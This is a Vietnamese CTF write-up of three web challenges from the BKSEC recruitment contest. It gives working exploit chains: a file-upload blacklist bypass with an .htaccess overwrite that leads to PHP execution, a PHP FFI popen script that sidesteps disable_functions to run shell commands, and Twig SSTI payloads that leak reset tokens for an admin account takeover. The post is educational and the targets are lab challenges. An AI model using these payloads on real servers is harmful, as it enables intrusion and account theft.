---
title: "BKSEC TTV 2027 — Write-ups vòng tuyển thành viên"
description: "Ghi lại cách mình giải 3 challenge Web trong kỳ tuyển thành viên BKSEC: File manager, The other flag và You've Got Mail."
date: 2026-11-23 10:00:00 +0700
lang: vi
categories: [CTF, BKSEC]
tags: [ctf, bksec, writeup, web-exploitation, file-upload, php, ssti, twig]
toc: true
media_subpath: /assets/img/posts/2026-11-23-bksec-ttv-2027-writeups
pin: false
---

Mình vừa tham gia kỳ thi tuyển thành viên CLB **BKSEC TTV 2027**, diễn ra trong hai ngày **21–22/11/2026**. Bài viết này ghi lại quá trình mình giải 3 challenge Web: **File manager**, **File Manager - The other flag** và **You've Got Mail**.

Mình giữ lại cả những hướng thử chưa thành công, vì chúng cũng giúp mình hiểu ứng dụng và tìm được hướng đi tiếp theo. Các payload, tài khoản và flag bên dưới đều thuộc những challenge trong kỳ thi.

| Challenge | Category | Difficulty | Hướng khai thác |
| --- | --- | --- | --- |
| File manager | Web | Medium | Lộ `.git`, lỗi xử lý tên file trùng và ghi đè `.htaccess` |
| File Manager - The other flag | Web | Medium | PHP FFI để gọi hàm native, thực thi `/readflag` |
| You've Got Mail | Web | Easy | SSTI trong Twig, lộ reset token và chiếm tài khoản admin |

## 1. File manager

### Đề bài

> Text-book vulnerability - I hope you can grab this easy challenge without AI. This challenges ALLOWS scanning!

### Thử upload file PHP

Trang web có một vài tính năng quản lý file cơ bản: upload, rename, delete và search. Theo kinh nghiệm ít ỏi của mình, hướng thử đầu tiên là upload một script PHP rồi dùng nó để đọc file chứa flag.

![Giao diện File Manager với các chức năng quản lý file](file-manager.webp)

Nhưng khi tải file PHP lên thì server trả về `file type not allowed`.

![Request upload file PHP bị từ chối](upload-blocked.webp)

Mình thử thay `Content-Type`, đổi đuôi `.php` thành `.php3`, `.php4`, `.phtml`, `.phar`, cũng như thêm null byte nhưng đều không thành công. Đến khi thêm một extension khác vào cuối, chẳng hạn `namtran.php.txt`, thì upload được.

![Upload thành công file có hai phần mở rộng](upload-double-extension.webp)

Dựa vào endpoint `/upload.php`, mình thử truy cập `/uploads/{file_name}` và tìm được nơi lưu file. Tuy nhiên, đời không như mơ: server chỉ trả về plain text, code PHP bên trong không được thực thi.

### Fuzzing và khôi phục source code từ `.git`

Đề bài cho phép scanning nên mình dùng wordlist [common.txt của SecLists](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/common.txt) để fuzzing. Kết quả có những đường dẫn đáng chú ý như `.git` và `.env`.

![Kết quả fuzzing các đường dẫn ở thư mục gốc](fuzz-root.webp)

Fuzz tiếp trong `/uploads`, mình thấy file `.htaccess` có thể truy cập được.

![Kết quả fuzzing thư mục uploads](fuzz-uploads.webp)

Nội dung cấu hình có đoạn:

```apache
<FilesMatch "\.ph.*$">
    Require all denied
</FilesMatch>
```

Cấu hình này từ chối truy cập các tên file khớp biểu thức trên, bao gồm `.php`, `.php3`, `.phtml` và cả tên như `namtran.php.txt`. Vì vậy, chỉ đưa được file PHP lên thư mục uploads vẫn chưa đủ.

Mình chuyển sang khai thác thư mục `.git` bị lộ bằng `git-dumper`, khôi phục được source code với các file như `upload.php`, `rename.php`, `lib.php`, `download.php` và `.env`.

![Dùng git-dumper để khôi phục source code](git-dumper.webp)

### Lỗi nằm ở cách xử lý file trùng tên

Trong `lib.php`, ứng dụng định nghĩa thư mục upload và blacklist extension:

```php
const UPLOAD_DIR = '/var/www/uploads';
const META_FILE   = '/var/www/data/files.json';
const BLOCKED_EXT = ['php', 'php2', 'php3', 'php4', 'php5', 'php6',
'php7', 'phps', 'phtml', 'pht', 'phar'];

function blocked(string $filename): bool
{
    $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
    return in_array($ext, BLOCKED_EXT, true);
}

function clean(string $name): string
{
    return basename(trim($name));
}
```

`clean()` loại bỏ khoảng trắng thừa ở hai đầu và lấy thành phần tên cuối cùng của đường dẫn. Còn `blocked()` dùng `PATHINFO_EXTENSION` để lấy extension ở dấu chấm cuối cùng rồi kiểm tra với blacklist.

Ví dụ:

```php
$file = 'nam.php.txt';

echo pathinfo($file, PATHINFO_EXTENSION);
// txt

echo pathinfo($file, PATHINFO_FILENAME);
// nam.php

echo pathinfo($file, PATHINFO_BASENAME);
// nam.php.txt

echo pathinfo($file, PATHINFO_DIRNAME);
// .
```

Vì vậy, `namtran.php.txt` vượt qua bước kiểm tra extension. Điểm quan trọng tiếp theo nằm trong `upload.php`:

```php
<?php

require __DIR__ . '/lib.php';

if ($_SERVER['REQUEST_METHOD'] !== 'POST' || !isset($_FILES['file'])) {
    http_response_code(400);
    exit('bad request');
}

$original = clean($_FILES['file']['name']);
if ($original === '') {
    http_response_code(400);
    exit('missing filename');
}

if (blocked($original)) {
    http_response_code(415);
    exit('file type not allowed');
}

$name = $original;
while (file_exists(UPLOAD_DIR . '/' . $name)) {
    $base = pathinfo($name, PATHINFO_FILENAME);
    if ($base === $name || $base === '') {
        http_response_code(409);
        exit('could not store file');
    }
    $name = $base;
}

if (!move_uploaded_file($_FILES['file']['tmp_name'], UPLOAD_DIR . '/' . $name)) {
    http_response_code(500);
    exit('storage error');
}

$meta = load_meta();
$id = bin2hex(random_bytes(4));
$meta[$id] = ['display' => $original, 'stored' => $name];
save_meta($meta);

header('Location: /index.php');
```

Khi file đã tồn tại, vòng `while` bỏ extension cuối cùng rồi kiểm tra lại. Chẳng hạn, với tên `nam.php.jpg.txt`, các tên có thể được xét lần lượt là:

```text
nam.php.jpg.txt → nam.php.jpg → nam.php → nam
```

Vòng lặp dừng ngay khi gặp một tên chưa tồn tại. Nhưng blacklist chỉ được kiểm tra với **tên ban đầu**, không được kiểm tra lại sau khi tên bị thay đổi.

Do đó, nếu `nam.php.txt` và `nam.php` chưa tồn tại:

1. Upload `nam.php.txt` lần đầu: server lưu nguyên tên.
2. Upload lại file cùng tên: server thấy trùng, bỏ `.txt` và lưu thành `nam.php`.

Vậy là mình đã đưa được file có đuôi `.php` lên server. Việc còn lại là xử lý `.htaccess` đang chặn truy cập.

### Ghi đè `.htaccess` qua chức năng rename

Mình thử upload trực tiếp một file `.htaccess` mới, thay cấu hình chặn bằng:

```apache
AddHandler application/x-httpd-php .php
```

Nhưng lại gặp lỗi. Do `.htaccess` đã tồn tại, server vào vòng xử lý tên trùng; `pathinfo('.htaccess', PATHINFO_FILENAME)` trả về chuỗi rỗng nên request bị từ chối.

![Upload trực tiếp htaccess thất bại do file đã tồn tại](htaccess-upload-failed.webp)

Nhận thấy còn chức năng rename, mình upload nội dung cấu hình với một tên file bình thường, rồi đổi tên thành `.htaccess`. Cách này ghi đè thành công cấu hình cũ.

![Đổi tên file đã upload thành htaccess](rename-htaccess.webp)

Sau khi kiểm tra lại, mình đã có thể truy cập và thực thi file PHP trong `/uploads`.

![File PHP đã được thực thi sau khi thay cấu hình](php-execution.webp)

### Đọc flag

Theo hint, flag nằm tại `/var/www/flag1.txt`, nên payload cuối cùng chỉ cần đọc file:

```php
<?php
$path = '/var/www/flag1.txt';
echo file_get_contents($path);
?>
```

Mình gửi file `6.php.txt` hai lần để lượt sau được lưu thành `6.php`, rồi truy cập `/uploads/6.php`.

![Kết quả đọc flag đầu tiên](flag1.webp)

```text
BKSEC{05b88a0a809f65ed7201781775c0ff8b_7054ca9839}
```

Điểm đáng nhớ ở bài này là tên file đã thay đổi **sau bước kiểm tra bảo mật**. Kết hợp với khả năng ghi đè `.htaccess` qua rename, lỗi xử lý tên trùng trở thành đường thực thi PHP.

## 2. File Manager - The other flag

### Đề bài

> yet another text-book things

### Từ thực thi PHP đến kiểm tra môi trường

Ứng dụng có logic xử lý giống bài trước, nên mình dùng lại chuỗi upload và thay `.htaccess`. Tuy nhiên, flag không còn ở đường dẫn cũ.

![Kiểm tra đường dẫn flag cũ trong challenge thứ hai](flag1-missing.webp)

Mình tìm đến các hàm thực thi lệnh hệ thống như `exec`, `system`, `shell_exec`, rồi upload đoạn PHP để kiểm tra môi trường:

```php
<?php
echo "PHP Version: " . PHP_VERSION . "\n\n";

echo "=== DISABLED FUNCTIONS ===\n";
echo ini_get('disable_functions') ?: 'None';

echo "\n\n=== AVAILABLE FUNCTIONS ===\n";

$functions = get_defined_functions();

foreach ($functions['internal'] as $function) {
    echo $function . "\n";
}
?>
```

Kết quả cho thấy server chạy PHP **8.2.36** và chặn hầu hết các hàm thực thi lệnh thường dùng.

![Phiên bản PHP và danh sách hàm bị vô hiệu hóa](disabled-functions.webp)

Mình kiểm tra thêm các cấu hình khác:

```php
<?php
$checks = [
    'PHP Version' => PHP_VERSION,
    'disable_functions' => ini_get('disable_functions'),
    'open_basedir' => ini_get('open_basedir'),
    'allow_url_fopen' => ini_get('allow_url_fopen'),
    'allow_url_include' => ini_get('allow_url_include'),
    'file_uploads' => ini_get('file_uploads'),
    'FFI enabled' => extension_loaded('FFI') ? 'YES' : 'NO',
    'FFI class' => class_exists('FFI', false) ? 'YES' : 'NO',
    'FFI enable setting' => ini_get('ffi.enable'),
];

foreach ($checks as $name => $value) {
    echo $name . ': ' . var_export($value, true) . "\n";
}
```

Cuối cùng cũng có một chỗ đáng chú ý: **FFI được bật**, class `FFI` có sẵn và `ffi.enable` bằng `1`.

![Cấu hình cho thấy PHP FFI được bật](ffi-enabled.webp)

### Gọi hàm native qua PHP FFI

FFI (*Foreign Function Interface*) cho phép PHP tương tác với thư viện native. Trong môi trường challenge này, mình có thể gọi hàm C từ `libc.so.6` mà không cần dùng những hàm PHP đã bị vô hiệu hóa.

Mình khai báo `popen`, `fgets` và `pclose`: mở tiến trình qua pipe, đọc output vào buffer, rồi đóng pipe khi xong.

```php
<?php

try {
    $ffi = FFI::cdef('
        typedef struct _IO_FILE FILE;
        FILE *popen(const char *command, const char *type);
        char *fgets(char *s, int size, FILE *stream);
        int pclose(FILE *stream);
    ', 'libc.so.6');

    $cmd = "id 2>&1";

    $fp = $ffi->popen($cmd, "r");

    if ($fp === null || FFI::isNull($fp)) {
        throw new Exception("popen failed");
    }

    $buffer = FFI::new("char[4096]");

    echo "<pre>";

    while (true) {
        $result = $ffi->fgets($buffer, 4096, $fp);

        if ($result === null || FFI::isNull($result)) {
            break;
        }

        echo htmlspecialchars(
            FFI::string($buffer),
            ENT_QUOTES | ENT_SUBSTITUTE,
            "UTF-8"
        );
    }

    echo "</pre>";

    $ffi->pclose($fp);

} catch (Throwable $e) {
    echo htmlspecialchars($e->getMessage());
}
```

`FFI::cdef()` khai báo các hàm C để PHP gọi trực tiếp. Chế độ `"r"` trong `$ffi->popen($cmd, "r")` dùng để đọc kết quả của lệnh trong `$cmd`; vòng `while` lấy từng phần output qua `fgets()`.

![Thực thi lệnh id thông qua FFI](ffi-id.webp)

### Tìm flag và thực thi `/readflag`

Đến đây, mình thay `$cmd` để tìm file liên quan đến flag ở thư mục gốc:

```php
$cmd = "find / -maxdepth 1 -type f -iname '*flag*' -print 2>&1";
```

Kết quả có `/flag2` và `/readflag`. Kiểm tra quyền:

```php
$cmd = "ls -lah /flag2 /readflag 2>&1";
```

```text
-r-------- 1 root root 60 Nov 22 02:53 /flag2
-rwsr-xr-x 1 root root 16K Nov 21 08:14 /readflag
```

Tiếp theo, mình xác định loại file:

```php
$cmd = "file /flag2 /readflag 2>&1";
```

```text
/flag2:    regular file, no read permission
/readflag: setuid ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV),
dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2,
BuildID[sha1]=63f557a02f9dfee1b7d5104a488ca957ab0a3f8a, for GNU/Linux
3.2.0, not stripped
```

Tiến trình hiện tại không có quyền đọc `/flag2`, nhưng `/readflag` là chương trình có bit setuid và có thể thực thi. Mình gọi nó:

```php
$cmd = "/readflag 2>&1";
```

Và nhận được flag:

```text
BKSEC{man_i_hope_AI_did_not_help_you_solve_this_f6a52e9020}
```

Bài này nhắc mình rằng chặn các hàm PHP quen thuộc bằng `disable_functions` vẫn chưa bao quát được khả năng gọi thư viện native khi FFI được bật cho script.

{% raw %}

## 3. You've Got Mail

### Đề bài

> Mình mới vibe code 1 con CRM với kha khá chức năng hữu ích cho khách hàng. Don''t RCE pls

Tài khoản Staff được cấp trong đề:

```text
Username: staff1
Password: staffpass123
```

### Nhận diện SSTI trong Twig

Ứng dụng CRM có đăng nhập, quên mật khẩu, dashboard và chỉnh sửa thông tin tài khoản. Chỗ đáng chú ý nhất là **edit template**: có cú pháp `{{ ... }}` để truy xuất dữ liệu khi preview và còn hiển thị chữ **TWIG**.

![Giao diện chỉnh sửa template email trong CRM](mail-template.webp)

Mình thử hai biểu thức:

```twig
{{7*7}}
{{7*'7'}}
```

![Thử biểu thức nhân trong phần preview template](twig-test.webp)

Trong challenge, cả hai đều trả về `49`. Kết quả này, cùng nhãn TWIG trên giao diện, giúp mình xác nhận hướng khai thác Twig. Đây cũng là cách phân biệt quen thuộc với Jinja2: biểu thức thứ hai trong Jinja2 thường cho ra `7777777`.

Ban đầu mình thử một số payload RCE nhưng không thành công. Nhớ lại gợi ý “Don't RCE pls” trong đề, mình chuyển sang hướng **Information Disclosure**.

### Liệt kê dữ liệu trong template context

Để xác định các biến được truyền vào template, mình dùng:

```twig
{{ _context|keys|join(', ') }}
```

![Liệt kê các biến trong template context](twig-context.webp)

Có một đối tượng đáng chú ý là `users`. Mình tiếp tục xem các key của nó và các field của phần tử đầu tiên:

```twig
{{ users|keys|join(', ') }}
{{ users[0]|keys|join(', ') }}
```

![Các chỉ mục trong đối tượng users](twig-users.webp)

![Các field của một user bị lộ qua template](twig-user-fields.webp)

Có 4 user, với những trường cần để ý như `role`, `password_hash_5531133f` và `reset_token_9e5b84be`. Tên field trong các ảnh chụp không hoàn toàn giống nhau: ảnh liệt kê ban đầu có hậu tố `9e5b84be`, còn ảnh đọc token về sau là `126c324e`. Khi làm bài cần dùng đúng key lấy được từ context ở thời điểm đó. Kiểm tra role cho thấy `users[0]` là admin.

![Xác định tài khoản có role admin](twig-admin.webp)

Mình thử khai thác trường password hash trước. Hash dùng bcrypt; dù thử hashcat với một vài wordlist, mình vẫn chưa khôi phục được mật khẩu.

Hướng tiếp theo là **reset token**, vì ứng dụng có sẵn tính năng quên mật khẩu. Ban đầu trường này chưa có giá trị; sau khi gửi yêu cầu reset, token mới được tạo.

### Thử luồng reset với tài khoản Staff

Trước hết, mình thử trên tài khoản được cấp. Trong trang sửa thông tin, email của Staff là `staff@nexacrm.local`.

![Email của tài khoản Staff trong trang hồ sơ](staff-profile.webp)

Sau khi gửi yêu cầu ở `/forgot-password`, mình quay lại template để đọc token.

```twig
{{ users[1].reset_token_126c324e }}
```

![Token reset xuất hiện sau khi gửi yêu cầu quên mật khẩu](staff-reset-token.webp)

Từ endpoint `/forgot-password`, mình thử đổi sang `/reset-password` và gặp form đặt mật khẩu mới bằng token vừa lấy được.

![Form đặt mật khẩu mới bằng reset token](reset-password.webp)

![Thông báo đặt lại mật khẩu thành công](reset-success.webp)

Luồng này xác nhận rằng token đọc được trong template có thể dùng để đổi mật khẩu tài khoản.

### Reset mật khẩu admin và lấy flag

Từ cấu trúc email Staff, mình đoán email admin là `admin@nexacrm.local`. Sau khi gửi yêu cầu reset cho email này, mình lấy token của `users[0]`:

```twig
{{ users[0].reset_token_126c324e }}
```

![Đọc reset token của admin qua template context](admin-reset-token.webp)

Mình dùng token để đặt lại mật khẩu, lấy tên đăng nhập admin từ dữ liệu đã lộ trong context, rồi đăng nhập vào tài khoản đó và nhận được flag:

```text
BKSEC{ch3ck_7h3_c0n73x7_my_fr133nd_a2cef5eee0}
```

Điểm thú vị ở bài này là SSTI không cần dẫn đến RCE để gây ảnh hưởng lớn. Chỉ riêng việc template truy cập được danh sách user và reset token đã đủ để chiếm tài khoản admin.

{% endraw %}
